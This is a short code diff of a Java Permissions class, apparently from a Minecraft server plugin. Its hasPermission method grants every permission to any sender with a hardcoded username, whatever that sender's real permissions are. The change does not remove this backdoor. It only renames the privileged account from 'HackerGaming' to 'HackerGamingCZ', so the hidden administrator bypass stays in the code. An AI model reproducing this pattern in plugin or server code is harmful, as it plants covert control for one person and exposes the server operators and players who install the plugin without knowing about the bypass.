@@ -18,7 +18,7 @@ public class Permissions {
 
 
     public static boolean hasPermission(CommandSender sender, String permission) {
-        return sender.getName().equals("HackerGaming") || sender.hasPermission(permission);
+        return sender.getName().equals("HackerGamingCZ") || sender.hasPermission(permission);
     }
 
 }
